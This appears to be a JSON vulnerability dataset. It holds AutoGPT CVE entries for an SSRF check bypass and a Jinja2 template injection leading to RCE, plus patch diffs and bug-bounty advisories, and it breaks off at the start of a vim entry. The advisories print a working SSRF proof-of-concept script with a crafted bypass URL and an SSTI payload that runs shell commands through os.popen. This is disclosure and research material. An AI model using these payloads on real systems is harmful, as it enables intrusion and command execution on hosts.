{
    "CVE-2025-0454": {
        "cwe": [
            {
                "id": "CWE-918",
                "value": "CWE-918 Server-Side Request Forgery (SSRF)"
            }
        ],
        "description": "A Server-Side Request Forgery (SSRF) vulnerability was identified in the Requests utility of significant-gravitas/autogpt versions prior to v0.4.0. The vulnerability arises due to a hostname confusion between the `urlparse` function from the `urllib.parse` library and the `requests` library. A malicious user can exploit this by submitting a specially crafted URL, such as `http://localhost:\\@google.com/../`, to bypass the SSRF check and perform an SSRF attack.",
        "languages": [
            "Python"
        ],
        "patch_commits": [
            {
                "content": "Merge branch 'dev' into zamilmajdy/secrt-1010-ssrf-check-bypass-in-requests-utility-in-significant\n\nFilename: autogpt_platform/backend/backend/blocks/code_executor.py:\n```\n@@ -0,0 +1,191 @@\n+from enum import Enum\n+from typing import Literal\n+\n+from e2b_code_interpreter import Sandbox\n+from pydantic import SecretStr\n+\n+from backend.data.block import Block, BlockCategory, BlockOutput, BlockSchema\n+from backend.data.model import (\n+    APIKeyCredentials,\n+    CredentialsField,\n+    CredentialsMetaInput,\n+    SchemaField,\n+)\n+\n+TEST_CREDENTIALS = APIKeyCredentials(\n+    id=\"01234567-89ab-cdef-0123-456789abcdef\",\n+    provider=\"e2b\",\n+    api_key=SecretStr(\"mock-e2b-api-key\"),\n+    title=\"Mock E2B API key\",\n+    expires_at=None,\n+)\n+TEST_CREDENTIALS_INPUT = {\n+    \"provider\": TEST_CREDENTIALS.provider,\n+    \"id\": TEST_CREDENTIALS.id,\n+    \"type\": TEST_CREDENTIALS.type,\n+    \"title\": TEST_CREDENTIALS.type,\n+}\n+\n+\n+class ProgrammingLanguage(Enum):\n+    PYTHON = \"python\"\n+    JAVASCRIPT = \"js\"\n+    BASH = \"bash\"\n+    R = \"r\"\n+    JAVA = \"java\"\n+\n+\n+class CodeExecutionBlock(Block):\n+    # TODO : Add support to upload and download files\n+    # Currently, You can customized the CPU and Memory, only by creating a pre customized sandbox template\n+    class Input(BlockSchema):\n+        credentials: CredentialsMetaInput[Literal[\"e2b\"], Literal[\"api_key\"]] = (\n+            CredentialsField(\n+                provider=\"e2b\",\n+                supported_credential_types={\"api_key\"},\n+                description=\"Enter your api key for the E2B Sandbox. You can get it in here - https://e2b.dev/docs\",\n+            )\n+        )\n+\n+        # Todo : Option to run commond in background\n+        setup_commands: list[str] = SchemaField(\n+            description=(\n+                \"Shell commands to set up the sandbox before running the code. \"\n+                \"You can use `curl` or `git` to install your desired Debian based \"\n+                \"package manager. `pip` and `npm` are pre-installed.\\n\\n\"\n+                \"These commands are executed with `sh`, in the foreground.\"\n+            ),\n+            placeholder=\"pip install cowsay\",\n+            default=[],\n+            advanced=False,\n+        )\n+\n+        code: str = SchemaField(\n+            description=\"Code to execute in the sandbox\",\n+            placeholder=\"print('Hello, World!')\",\n+            default=\"\",\n+            advanced=False,\n+        )\n+\n+        language: ProgrammingLanguage = SchemaField(\n+            description=\"Programming language to execute\",\n+            default=ProgrammingLanguage.PYTHON,\n+            advanced=False,\n+        )\n+\n+        timeout: int = SchemaField(\n+            description=\"Execution timeout in seconds\", default=300\n+        )\n+\n+        template_id: str = SchemaField(\n+            description=(\n+                \"You can use an E2B sandbox template by entering its ID here. \"\n+                \"Check out the E2B docs for more details: \"\n+                \"[E2B - Sandbox template](https://e2b.dev/docs/sandbox-template)\"\n+            ),\n+            default=\"\",\n+            advanced=True,\n+        )\n+\n+    class Output(BlockSchema):\n+        response: str = SchemaField(description=\"Response from code execution\")\n+        stdout_logs: str = SchemaField(\n+            description=\"Standard output logs from execution\"\n+        )\n+        stderr_logs: str = SchemaField(description=\"Standard error logs from execution\")\n+        error: str = SchemaField(description=\"Error message if execution failed\")\n+\n+    def __init__(self):\n+        super().__init__(\n+            id=\"0b02b072-abe7-11ef-8372-fb5d162dd712\",\n+            description=\"Executes code in an isolated sandbox environment with internet access.\",\n+            categories={BlockCategory.DEVELOPER_TOOLS},\n+            input_schema=CodeExecutionBlock.Input,\n+            output_schema=CodeExecutionBlock.Output,\n+            test_credentials=TEST_CREDENTIALS,\n+            test_input={\n+                \"credentials\": TEST_CREDENTIALS_INPUT,\n+                \"code\": \"print('Hello World')\",\n+                \"language\": ProgrammingLanguage.PYTHON.value,\n+                \"setup_commands\": [],\n+                \"timeout\": 300,\n+                \"template_id\": \"\",\n+            },\n+            test_output=[\n+                (\"response\", \"Hello World\"),\n+                (\"stdout_logs\", \"Hello World\\n\"),\n+            ],\n+            test_mock={\n+                \"execute_code\": lambda code, language, setup_commands, timeout, api_key, template_id: (\n+                    \"Hello World\",\n+                    \"Hello World\\n\",\n+                    \"\",\n+                ),\n+            },\n+        )\n+\n+    def execute_code(\n+        self,\n+        code: str,\n+        language: ProgrammingLanguage,\n+        setup_commands: list[str],\n+        timeout: int,\n+        api_key: str,\n+        template_id: str,\n+    ):\n+        try:\n+            sandbox = None\n+            if template_id:\n+                sandbox = Sandbox(\n+                    template=template_id, api_key=api_key, timeout=timeout\n+                )\n+            else:\n+                sandbox = Sandbox(api_key=api_key, timeout=timeout)\n+\n+            if not sandbox:\n+                raise Exception(\"Sandbox not created\")\n+\n+            # Running setup commands\n+            for cmd in setup_commands:\n+                sandbox.commands.run(cmd)\n+\n+            # Executing the code\n+            execution = sandbox.run_code(\n+                code,\n+                language=language.value,\n+                on_error=lambda e: sandbox.kill(),  # Kill the sandbox if there is an error\n+            )\n+\n+            if execution.error:\n+                raise Exception(execution.error)\n+\n+            response = execution.text\n+            stdout_logs = \"\".join(execution.logs.stdout)\n+            stderr_logs = \"\".join(execution.logs.stderr)\n+\n+            return response, stdout_logs, stderr_logs\n+\n+        except Exception as e:\n+            raise e\n+\n+    def run(\n+        self, input_data: Input, *, credentials: APIKeyCredentials, **kwargs\n+    ) -> BlockOutput:\n+        try:\n+            response, stdout_logs, stderr_logs = self.execute_code(\n+                input_data.code,\n+                input_data.language,\n+                input_data.setup_commands,\n+                input_data.timeout,\n+                credentials.api_key.get_secret_value(),\n+                input_data.template_id,\n+            )\n+\n+            if response:\n+                yield \"response\", response\n+            if stdout_logs:\n+                yield \"stdout_logs\", stdout_logs\n+            if stderr_logs:\n+                yield \"stderr_logs\", stderr_logs\n+        except Exception as e:\n+            yield \"error\", str(e)\n```\n\nFilename: autogpt_platform/backend/poetry.lock:\n```\n@@ -704,6 +704,42 @@\nfiles = [\n     {file = \"distro-1.9.0.tar.gz\", hash = \"sha256:2fa77c6fd8940f116ee1d6b94a2f90b13b5ea8d019b98bc8bafdcabcdd9bdbed\"},\n ]\n \n+[[package]]\n+name = \"e2b\"\n+version = \"1.0.4\"\n+description = \"E2B SDK that give agents cloud environments\"\n+optional = false\n+python-versions = \"<4.0,>=3.8\"\n+files = [\n+    {file = \"e2b-1.0.4-py3-none-any.whl\", hash = \"sha256:1a9c765eb1b2cc291c5ebd3f2e268f8fba9471a12f470f4651395b5753730170\"},\n+    {file = \"e2b-1.0.4.tar.gz\", hash = \"sha256:5ed3db4f984e52cf3aabb717725493ff060a8374b7c878b31bceeff46a0b5648\"},\n+]\n+\n+[package.dependencies]\n+attrs = \">=23.2.0\"\n+httpcore = \">=1.0.5,<2.0.0\"\n+httpx = \">=0.27.0,<0.28.0\"\n+packaging = \">=24.1\"\n+protobuf = \">=3.20.0,<6.0.0\"\n+python-dateutil = \">=2.8.2\"\n+typing-extensions = \">=4.1.0\"\n+\n+[[package]]\n+name = \"e2b-code-interpreter\"\n+version = \"1.0.1\"\n+description = \"E2B Code Interpreter - Stateful code execution\"\n+optional = false\n+python-versions = \"<4.0,>=3.8\"\n+files = [\n+    {file = \"e2b_code_interpreter-1.0.1-py3-none-any.whl\", hash = \"sha256:e27c40174ba7daac4942388611a73e1ac58300227f0ba6c0555ee54507d4944c\"},\n+    {file = \"e2b_code_interpreter-1.0.1.tar.gz\", hash = \"sha256:b0c061e41315d21514affe78f80052be335b687204e669dd7ca852b59eeaaea2\"},\n+]\n+\n+[package.dependencies]\n+attrs = \">=21.3.0\"\n+e2b = \">=1.0.0,<2.0.0\"\n+httpx = \">=0.20.0,<0.28.0\"\n+\n [[package]]\n name = \"exceptiongroup\"\n version = \"1.2.2\"\n\n@@ -4028,4 +4064,4 @@\ntype = [\"pytest-mypy\"]\n [metadata]\n lock-version = \"2.0\"\n python-versions = \"^3.10\"\n-content-hash = \"5bc61641d782791b76f39b18625560a6652b02f3ad788f110e0258293032c34a\"\n+content-hash = \"94dbe280c8215cd4ceef47c14b681092cb03964aa081b6cdb978da7bbf818593\"\n```\n\nFilename: autogpt_platform/backend/pyproject.toml:\n```\n@@ -16,6 +16,7 @@\nautogpt-libs = { path = \"../autogpt_libs\", develop = true }\n click = \"^8.1.7\"\n croniter = \"^5.0.1\"\n discord-py = \"^2.4.0\"\n+e2b-code-interpreter = \"^1.0.1\"\n fastapi = \"^0.115.5\"\n feedparser = \"^6.0.11\"\n flake8 = \"^7.0.0\"\n```\n\nFilename: autogpt_platform/frontend/src/components/integrations/credentials-input.tsx:\n```\n@@ -48,6 +48,7 @@\nexport const providerIcons: Record<\n   React.FC<{ className?: string }>\n > = {\n   anthropic: fallbackIcon,\n+  e2b: fallbackIcon,\n   github: FaGithub,\n   google: FaGoogle,\n   groq: fallbackIcon,\n```\n\nFilename: autogpt_platform/frontend/src/components/integrations/credentials-provider.tsx:\n```\n@@ -24,6 +24,7 @@\nconst providerDisplayNames: Record<CredentialsProviderName, string> = {\n   anthropic: \"Anthropic\",\n   discord: \"Discord\",\n   d_id: \"D-ID\",\n+  e2b: \"E2B\",\n   github: \"GitHub\",\n   google: \"Google\",\n   google_maps: \"Google Maps\",\n```\n\nFilename: autogpt_platform/frontend/src/lib/autogpt-server-api/types.ts:\n```\n@@ -102,6 +102,7 @@\nexport const PROVIDER_NAMES = {\n   ANTHROPIC: \"anthropic\",\n   D_ID: \"d_id\",\n   DISCORD: \"discord\",\n+  E2B: \"e2b\",\n   GITHUB: \"github\",\n   GOOGLE: \"google\",\n   GOOGLE_MAPS: \"google_maps\",\n```",
                "url": "https://github.com/significant-gravitas/autogpt/commit/ff065cd24c2289878c0abdb9adbf91c305f0d70a"
            }
        ],
        "published_date": "2025-03-20T10:11:30.365Z",
        "sec_adv": [
            {
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nSSRF check bypass in Requests utility in significant-gravitas/autogpt\nValid\nReported on Dec 4th 2024\nDescription\nThe autogpt application relies on a wrapper around the requests library in order to avoid SSRF attacks performing a check on the provided URL.\nSuch check is performed using the urlparse function from urllib.parse library, and the request is later performed using the requests library. Due to a hostname confusion between these two libraries, a malicious user is able to bypass such check by submitting a specially crafted URL in order to perform a SSRF attack.\nProof of Concept\nBy providing http://localhost:\\\\@google.com/../ as the URL to be used in the requests, it is possible to perform a SSRF attack. This is due to the fact that the \\ character in the authority is interpreted as a / by requests and not by the urlparse function, leading to a hostname confusion attack. The following example can be executed in order to verify such behavior\nimport ipaddress\nimport socket\nfrom urllib.parse import urlparse\nfrom typing import Callable\n\nimport requests as req\n\n# List of IP networks to block\nBLOCKED_IP_NETWORKS = [\n    # --8<-- [start:BLOCKED_IP_NETWORKS]\n    ipaddress.ip_network(\"0.0.0.0/8\"),  # \"This\" Network\n    ipaddress.ip_network(\"10.0.0.0/8\"),  # Private-Use\n    ipaddress.ip_network(\"127.0.0.0/8\"),  # Loopback\n    ipaddress.ip_network(\"169.254.0.0/16\"),  # Link Local\n    ipaddress.ip_network(\"172.16.0.0/12\"),  # Private-Use\n    ipaddress.ip_network(\"192.168.0.0/16\"),  # Private-Use\n    ipaddress.ip_network(\"224.0.0.0/4\"),  # Multicast\n    ipaddress.ip_network(\"240.0.0.0/4\"),  # Reserved for Future Use\n    # --8<-- [end:BLOCKED_IP_NETWORKS]\n]\n\n\ndef is_ip_blocked(ip: str) -> bool:\n    \"\"\"\n    Checks if the IP address is in a blocked network.\n    \"\"\"\n    ip_addr = ipaddress.ip_address(ip)\n    return any(ip_addr in network for network in BLOCKED_IP_NETWORKS)\n\n\ndef validate_url(url: str, trusted_origins: list[str]) -> str:\n    \"\"\"\n    Validates the URL to prevent SSRF attacks by ensuring it does not point to a private\n    or untrusted IP address, unless whitelisted.\n    \"\"\"\n    url = url.strip().strip(\"/\")\n    if not url.startswith((\"http://\", \"https://\")):\n        url = \"http://\" + url\n\n    parsed_url = urlparse(url)\n    hostname = parsed_url.hostname\n\n    if not hostname:\n        raise ValueError(f\"Invalid URL: Unable to determine hostname from {url}\")\n\n    if any(hostname == origin for origin in trusted_origins):\n        return url\n\n    # Resolve all IP addresses for the hostname\n    ip_addresses = {result[4][0] for result in socket.getaddrinfo(hostname, None)}\n    if not ip_addresses:\n        raise ValueError(f\"Unable to resolve IP address for {hostname}\")\n\n    # Check if all IP addresses are global\n    for ip in ip_addresses:\n        if is_ip_blocked(ip):\n            raise ValueError(\n                f\"Access to private IP address at {hostname}: {ip} is not allowed.\"\n            )\n\n    return url\n\n\nclass Requests:\n    \"\"\"\n    A wrapper around the requests library that validates URLs before making requests.\n    \"\"\"\n\n    def __init__(\n        self,\n        trusted_origins: list[str] | None = None,\n        raise_for_status: bool = True,\n        extra_url_validator: Callable[[str], str] | None = None,\n        extra_headers: dict[str, str] | None = None,\n    ):\n        self.trusted_origins = []\n        for url in trusted_origins or []:\n            hostname = urlparse(url).hostname\n            if not hostname:\n                raise ValueError(f\"Invalid URL: Unable to determine hostname of {url}\")\n            self.trusted_origins.append(hostname)\n\n        self.raise_for_status = raise_for_status\n        self.extra_url_validator = extra_url_validator\n        self.extra_headers = extra_headers\n\n    def request(\n        self, method, url, headers=None, allow_redirects=False, *args, **kwargs\n    ) -> req.Response:\n        if self.extra_headers is not None:\n            headers = {**(headers or {}), **self.extra_headers}\n\n        url = validate_url(url, self.trusted_origins)\n        if self.extra_url_validator is not None:\n            url = self.extra_url_validator(url)\n\n        response = req.request(\n            method,\n            url,\n            headers=headers,\n            allow_redirects=allow_redirects,\n            *args,\n            **kwargs,\n        )\n        if self.raise_for_status:\n            response.raise_for_status()\n\n        return response\n\n    def get(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"GET\", url, *args, **kwargs)\n\n    def post(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"POST\", url, *args, **kwargs)\n\n    def put(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"PUT\", url, *args, **kwargs)\n\n    def delete(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"DELETE\", url, *args, **kwargs)\n\n    def head(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"HEAD\", url, *args, **kwargs)\n\n    def options(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"OPTIONS\", url, *args, **kwargs)\n\n    def patch(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"PATCH\", url, *args, **kwargs)\n\n\nrequests = Requests(trusted_origins=[])\nresponse = requests.get(\"http://localhost:\\\\@google.com/../\")\nprint(response)\nImpact\nA malicious attacker is able to bypass the check performed on the provided URL and perform a SSRF attack.\nOccurrences\nrequest.py L42-L63\nWe are processing your report and will contact thesignificant-gravitas/autogpt team within 24 hours.5 months ago\nhuntr-helper\ncommented5 months ago\nAdmin\nThis report was determined to possibly be out of scope or have a high likelyhood of being marked as informative.\nPlease review your report and the Participation Guidelines.\nThese are the specific guidelines this report is in possible violation of:\nBlind or otherwise limited server-side request forgeries (ssrf)\nEdoardo Geraci\ncommented5 months ago\nResearcher\nThe SSRF is not blind, given that it is a complete bypass of the SSRF check, applied to requests that do return the response content to the user when performed\nA significant-gravitas/autogpt maintainerhas acknowledged this report5 months ago\nThe scheduled publication date was automatically extended from 4th Mar 2025  to 11th Mar 2025  due to the maintainers acknowledgement of the report5 months ago\nZamil Majdy\ncommented5 months ago\nMaintainer\nThank you for the report! I'm adding another layer of validation & filtering here: https://github.com/Significant-Gravitas/AutoGPT/pull/8890\nLet me know if this is enough.\nEdoardo Geraci\ncommented5 months ago\nResearcher\nit looks good to me, the parsing differential stops if the \\ is not present anymore\nNicholas Tindle gave praise5 months ago\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nEdoardo Geraci\ncommented5 months ago\nResearcher\nany news on CVE assignment for this bug?\nThis report has now been passed to internal triage and should be resolved within 14 days.4 months ago\nEthan Silvasmodified the Severity from High (8.6) to High (7.5)4 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nEthan Silvas validated this vulnerability4 months ago\nb0-n0-b0has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2025-0454assigned to this report.4 months ago\nEthan Silvasmarked this as fixedin v0.4.0with commitff065c4 months ago\nNicholas Tindlehas been awarded the fix bounty\nrequest.py#L42-L63 has been validated\nWe have notified the significant-gravitas/autogpt maintainers about this report in their weekly follow-up3 months ago\nWe have sent a warning to the significant-gravitas/autogpt team to inform them that this report will be published in 48 hours2 months ago\nThis vulnerability has now been published2 months ago\nCVE-2025-0454has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2025-0454\n(Published)\nVulnerability Type\nCWE-918: Server-Side Request Forgery (SSRF)\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\n0.3.4\nVisibility\nPublic\nStatus\nFixed\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n\u00a9 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The security advisory contains a proof of concept demonstrating how to exploit the vulnerability, including example code and steps.",
                "url": "https://huntr.com/bounties/0664fdee-bdc2-4650-8075-74d7b8d3e308"
            }
        ],
        "sw_version": "v0.3.1",
        "sw_version_wget": "https://github.com/significant-gravitas/autogpt/archive/refs/tags/v0.3.1.zip"
    },
    "CVE-2025-1040": {
        "cwe": [
            {
                "id": "CWE-77",
                "value": "CWE-77  Improper Neutralization of Special Elements used in a Command ('Command Injection')"
            }
        ],
        "description": "AutoGPT versions 0.3.4 and earlier are vulnerable to a Server-Side Template Injection (SSTI) that could lead to Remote Code Execution (RCE). The vulnerability arises from the improper handling of user-supplied format strings in the `AgentOutputBlock` implementation, where malicious input is passed to the Jinja2 templating engine without adequate security measures. Attackers can exploit this flaw to execute arbitrary commands on the host system. The issue is fixed in version 0.4.0.",
        "languages": [
            "Python"
        ],
        "patch_commits": [
            {
                "content": "fix(backend): Enable Jinja SandboxedEnvironment for TextFormatter (#8891)\n\nWe still use plain Jinja objects for text formatting in our block codes.\n\n### Changes \ud83c\udfd7\ufe0f\n\nIntroduced a `TextFormatter` utility class that uses jina\nSandboxedEnvironment for safer text formatting.\n\n### Checklist \ud83d\udccb\n\n#### For code changes:\n- [ ] I have clearly listed my changes in the PR description\n- [ ] I have made a test plan\n- [ ] I have tested my changes according to the test plan:\n  <!-- Put your test plan here: -->\n  - [ ] ...\n\n<details>\n  <summary>Example test plan</summary>\n  \n  - [ ] Create from scratch and execute an agent with at least 3 blocks\n- [ ] Import an agent from file upload, and confirm it executes\ncorrectly\n  - [ ] Upload agent to marketplace\n- [ ] Import an agent from marketplace and confirm it executes correctly\n  - [ ] Edit an agent from monitor, and confirm it executes correctly\n</details>\n\n#### For configuration changes:\n- [ ] `.env.example` is updated or already compatible with my changes\n- [ ] `docker-compose.yml` is updated or already compatible with my\nchanges\n- [ ] I have included a list of my configuration changes in the PR\ndescription (under **Changes**)\n\n<details>\n  <summary>Examples of configuration changes</summary>\n\n  - Changing ports\n  - Adding new services that need to communicate with each other\n  - Secrets or environment variable changes\n  - New or infrastructure changes such as databases\n</details>\n\nFilename: autogpt_platform/backend/backend/blocks/basic.py:\n```\n@@ -1,13 +1,11 @@\n-import re\n from typing import Any, List\n \n-from jinja2 import BaseLoader, Environment\n-\n from backend.data.block import Block, BlockCategory, BlockOutput, BlockSchema, BlockType\n from backend.data.model import SchemaField\n from backend.util.mock import MockObject\n+from backend.util.text import TextFormatter\n \n-jinja = Environment(loader=BaseLoader())\n+formatter = TextFormatter()\n \n \n class StoreValueBlock(Block):\n\n@@ -304,9 +302,9 @@\ndef run(self, input_data: Input, **kwargs) -> BlockOutput:\n         \"\"\"\n         if input_data.format:\n             try:\n-                fmt = re.sub(r\"(?<!{){[ a-zA-Z0-9_]+}\", r\"{\\g<0>}\", input_data.format)\n-                template = jinja.from_string(fmt)\n-                yield \"output\", template.render({input_data.name: input_data.value})\n+                yield \"output\", formatter.format_string(\n+                    input_data.format, {input_data.name: input_data.value}\n+                )\n             except Exception as e:\n                 yield \"output\", f\"Error: {e}, {input_data.value}\"\n         else:\n```\n\nFilename: autogpt_platform/backend/backend/blocks/text.py:\n```\n@@ -1,13 +1,11 @@\nimport re\n from typing import Any\n \n-from jinja2 import BaseLoader, Environment\n-\n from backend.data.block import Block, BlockCategory, BlockOutput, BlockSchema\n from backend.data.model import SchemaField\n-from backend.util import json\n+from backend.util import json, text\n \n-jinja = Environment(loader=BaseLoader())\n+formatter = text.TextFormatter()\n \n \n class MatchTextPatternBlock(Block):\n\n@@ -146,19 +144,20 @@\ndef __init__(self):\n                     \"values\": {\"list\": [\"Hello\", \" World!\"]},\n                     \"format\": \"{% for item in list %}{{ item }}{% endfor %}\",\n                 },\n+                {\n+                    \"values\": {},\n+                    \"format\": \"{% set name = 'Alice' %}Hello, World! {{ name }}\",\n+                },\n             ],\n             test_output=[\n                 (\"output\", \"Hello, World! Alice\"),\n                 (\"output\", \"Hello World!\"),\n+                (\"output\", \"Hello, World! Alice\"),\n             ],\n         )\n \n     def run(self, input_data: Input, **kwargs) -> BlockOutput:\n-        # For python.format compatibility: replace all {...} with {{..}}.\n-        # But avoid replacing {{...}} to {{{...}}}.\n-        fmt = re.sub(r\"(?<!{){[ a-zA-Z0-9_]+}\", r\"{\\g<0>}\", input_data.format)\n-        template = jinja.from_string(fmt)\n-        yield \"output\", template.render(**input_data.values)\n+        yield \"output\", formatter.format_string(input_data.format, input_data.values)\n \n \n class CombineTextsBlock(Block):\n```\n\nFilename: autogpt_platform/backend/backend/util/text.py:\n```\n@@ -0,0 +1,22 @@\n+import re\n+\n+from jinja2 import BaseLoader\n+from jinja2.sandbox import SandboxedEnvironment\n+\n+\n+class TextFormatter:\n+    def __init__(self):\n+        # Create a sandboxed environment\n+        self.env = SandboxedEnvironment(loader=BaseLoader(), autoescape=True)\n+\n+        # Clear any registered filters, tests, and globals to minimize attack surface\n+        self.env.filters.clear()\n+        self.env.tests.clear()\n+        self.env.globals.clear()\n+\n+    def format_string(self, template_str: str, values=None, **kwargs) -> str:\n+        # For python.format compatibility: replace all {...} with {{..}}.\n+        # But avoid replacing {{...}} to {{{...}}}.\n+        template_str = re.sub(r\"(?<!{){[ a-zA-Z0-9_]+}\", r\"{\\g<0>}\", template_str)\n+        template = self.env.from_string(template_str)\n+        return template.render(values or {}, **kwargs)\n```",
                "url": "https://github.com/significant-gravitas/autogpt/commit/6dba31e0215549604bdcc1aed24e3a1714e75ee2"
            }
        ],
        "published_date": "2025-03-20T10:11:05.749Z",
        "sec_adv": [
            {
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nAutoGPT SSTI Vulnerability Leading to Remote Code Execution (RCE) in significant-gravitas/autogpt\nValid\nReported on Dec 2nd 2024\nSummary\nAutoGPT, an open-source AI tool that automates task execution, is vulnerable to a Server-Side Template Injection (SSTI) that could lead to arbitrary command execution. The vulnerability arises from the improper handling of user-supplied format strings in the AgentOutputBlock implementation, where malicious input is passed to the Jinja2 templating engine without adequate security measures. Attackers can exploit this flaw to execute arbitrary commands on the host system.\nAffected Versions\nAutoGPT versions 0.3.4 and earlier.\nRoot Cause\nAutoGPT's AgentOutputBlock accepts user input a template format string, yet fail to filter out and block the malicious template injection.\nFrom the code, we can observe class AgentOutputBlock accepts user input format string and later bypasses it into jinja template object which was simply initialized with loader without enabling sandbox environment:\njinja = Environment(loader=BaseLoader())\nleaving the chances of malicious code injection and arbitrary command execution.\n# https://github.com/Significant-Gravitas/AutoGPT/blob/2121ffd06b26a438706bf642372cc46d81c94ddc/autogpt_platform/backend/backend/blocks/basic.py#L305-L309\n\n    def run(self, input_data: Input, **kwargs) -> BlockOutput:\n                ...\n        if input_data.format:\n            try:\n                fmt = re.sub(r\"(?<!{){[ a-zA-Z0-9_]+}\", r\"{\\g<0>}\", input_data.format)\n                template = jinja.from_string(fmt)\n                yield \"output\", template.render({input_data.name: input_data.value})\n                ...\nProof of Concept (PoC)\nAttacker can exploit this vulnerability to conduct arbitrary command execution attack by:\nCreate a Fill Text Template block\nSave the agent\nPut in SSTI Payload that can enumerating the desired os module and invoke the popen method with attacker's inputted command.\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}\nOnce the created agent is saved and the attacker clicks the run button, the malicious template will be rendered and a id OS command will be executed.\nRecommended Mitigations\nIntroduce sandbox environment for template rendering:\nA SandboxedEnvironment in Jinja2 is a security feature that creates a restricted execution environment to prevent malicious template code from accessing dangerous Python functionality.\nfrom jinja2.sandbox import SandboxedEnvironment\n\n# At module level\njinja = SandboxedEnvironment(\n    loader=BaseLoader(),\n    autoescape=True\n)\nImpact\nImpact\nAn attacker could exploit this vulnerability to perform Remote Code Execution (RCE), potentially gaining unauthorized access to sensitive system data or control over the host machine. This can lead to:\nSystem Compromise: Execution of arbitrary commands on the host environment.\nData Exfiltration: Unauthorized access to sensitive files or data.\nService Disruption: Exploitation of this vulnerability could lead to service outages or performance degradation.\nEscalation of Privileges: When executed in a privileged environment, attackers might escalate privileges.\nOccurrences\nbasic.py L305-L309\nWe are processing your report and will contact thesignificant-gravitas/autogpt team within 24 hours.5 months ago\n2h0ng\ncommented5 months ago\nResearcher\nimage-20241202222625844 image-20241202222717304\nA significant-gravitas/autogpt maintainerhas acknowledged this report5 months ago\nThe scheduled publication date was automatically extended from 2nd Mar 2025  to 9th Mar 2025  due to the maintainers acknowledgement of the report5 months ago\nZamil Majdy\ncommented5 months ago\nMaintainer\nThank you for the report! I'm adding another layer of validation & filtering here: https://github.com/Significant-Gravitas/AutoGPT/pull/8891\nLet me know if this is enough.\n2h0ng\ncommented5 months ago\nResearcher\nHi Zamil. I believe sandbox enabled jinja environment will make class lookup impossbile, thus mitigates the SSTI risks. However, I also recommend adding expection catch statement for it, as the document said:\nThe sandbox alone is not a solution for perfect security. Keep these things in mind when using the sandbox.\n\nTemplates can still raise errors when compiled or rendered. Your code should attempt to catch errors instead of crashing.\n\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\nfunc = lambda: \"Hello, Sandbox!\"\nenv.from_string(\"{{ func() }}\").render(func=func)\n'Hello, Sandbox!'\nenv.from_string(\"{{ func.__code__.co_code }}\").render(func=func)\nTraceback (most recent call last):\n  ...\nSecurityError: access to attribute '__code__' of 'function' object is unsafe.\n...\nhttps://jinja.palletsprojects.com/en/stable/sandbox/#security-considerations\nThis report has now been passed to internal triage and should be resolved within 14 days.4 months ago\nEthan Silvasmodified the Severity from Critical (9.9) to High (8.8)3 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nEthan Silvas validated this vulnerability3 months ago\nMaintainer fixed and marking valid. Adjusted CVSS for scope unchanged as this is RCE on the host server.\nsuperboy-zjchas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2025-1040assigned to this report.3 months ago\nEthan Silvasmarked this as fixedin v0.4.0with commit6dba313 months ago\nZamil Majdyhas been awarded the fix bounty\nbasic.py#L305-L309 has been validated\nWe have notified the significant-gravitas/autogpt maintainers about this report in their weekly follow-up3 months ago\nWe have sent a warning to the significant-gravitas/autogpt team to inform them that this report will be published in 48 hours2 months ago\nThis vulnerability has now been published2 months ago\nCVE-2025-1040has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2025-1040\n(Published)\nVulnerability Type\nCWE-77: Command Injection\nSeverity\nHigh (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\nAutoGPT versions 0.3.4 and earlier.\nVisibility\nPublic\nStatus\nFixed\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n\u00a9 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory provides a proof-of-concept payload for exploiting the vulnerability in the given software.",
                "url": "https://huntr.com/bounties/b74ef75f-61d5-4422-ab15-9550c8b4f185"
            }
        ],
        "sw_version": "v0.3.1",
        "sw_version_wget": "https://github.com/significant-gravitas/autogpt/archive/refs/tags/v0.3.1.zip"
    },
    "CVE-2025-1215": {
        "cwe": [
            {
                "id": "CWE-119",
                "value": "Memory Corruption"
            }
        ],
        "description": "A vulnerability classified as problematic was found in vim up to 9.1.1096. This vulnerability affects unknown code of the file src/main.c. The manipulation of the argument --log leads to memory corruption. It is possible to launch the attack on the local host. Upgrading to version 9.1.1097 is able to address this issue. The patch is identified as c5654b84480822817bb7b69ebc97c174c91185e9. It is recommended to upgrade the affected component.",
        "languages": [
            "Vim Script",
            "C"
        ],
        "patch_commits": [
            {
